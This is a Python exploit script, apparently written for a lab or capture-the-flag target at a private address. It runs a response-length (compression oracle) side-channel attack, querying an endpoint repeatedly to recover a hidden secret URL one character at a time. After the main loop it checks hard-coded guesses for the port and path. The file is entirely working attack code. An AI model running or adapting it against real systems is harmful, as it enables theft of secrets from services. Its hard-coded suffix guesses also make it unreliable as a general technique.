import requests
import string

TARGET_URL = "http://172.19.0.3:5000/sql-panel/crack"
SECRET_PREFIX = "/"
CHARSET = string.ascii_letters + string.digits + "/:?.=_-"
GARBAGE = "!@#$%^&*()_+[]{}|;:'\",.<>?~`" * 5  # Even longer garbage

def get_length(data):
    """Fetch the Content-Length for a given data parameter."""
    response = requests.get(TARGET_URL, params={'data': data})
    return int(response.headers['Content-Length'])

def find_secret():
    secret = SECRET_PREFIX
    print(f"[+] Starting with: {secret}")
    
    # First extract until we reach "http://internal"
    while not secret.endswith("http://internal"):
        min_length = float('inf')
        best_candidate = None
        
        for c in CHARSET:
            candidate = secret + c
            candidate_payload = candidate + GARBAGE
            length = get_length(candidate_payload)
            
            if length < min_length:
                min_length = length
                best_candidate = candidate
        
        if best_candidate is None:
            print("[-] No candidate found. Stopping.")
            break
        
        secret = best_candidate
        print(f"[+] Found so far: {secret}")
    
    print("[+] Reached 'http://internal', now handling port and path...")
    
    # Now handle the port part ":5000"
    port_chars = ":5000"
    for c in port_chars:
        # For each character in the port, test it
        candidate = secret + c
        candidate_payload = candidate + GARBAGE
        length = get_length(candidate_payload)
        
        # Also test other characters to verify this is the correct one
        other_candidates = []
        for other_char in CHARSET:
            if other_char != c:
                other_candidate = secret + other_char
                other_payload = other_candidate + GARBAGE
                other_length = get_length(other_payload)
                other_candidates.append((other_char, other_length))
        
        # Check if our candidate gives the shortest length
        if all(length <= other_length for _, other_length in other_candidates):
            secret = candidate
            print(f"[+] Found port character: {c}")
            print(f"[+] Current secret: {secret}")
        else:
            print(f"[-] Issue with character {c}, might need manual intervention")
            break
    
    # Now handle the path part "/internal"
    path_chars = "/internal"
    for c in path_chars:
        # For each character in the path, test it
        candidate = secret + c
        candidate_payload = candidate + GARBAGE
        length = get_length(candidate_payload)
        
        # Also test other characters to verify this is the correct one
        other_candidates = []
        for other_char in CHARSET:
            if other_char != c:
                other_candidate = secret + other_char
                other_payload = other_candidate + GARBAGE
                other_length = get_length(other_payload)
                other_candidates.append((other_char, other_length))
        
        # Check if our candidate gives the shortest length
        if all(length <= other_length for _, other_length in other_candidates):
            secret = candidate
            print(f"[+] Found path character: {c}")
            print(f"[+] Current secret: {secret}")
        else:
            print(f"[-] Issue with character {c}, might need manual intervention")
            break
    
    return secret

if __name__ == "__main__":
    extracted_secret = find_secret()
    print(f"Final Extracted Secret: {extracted_secret}")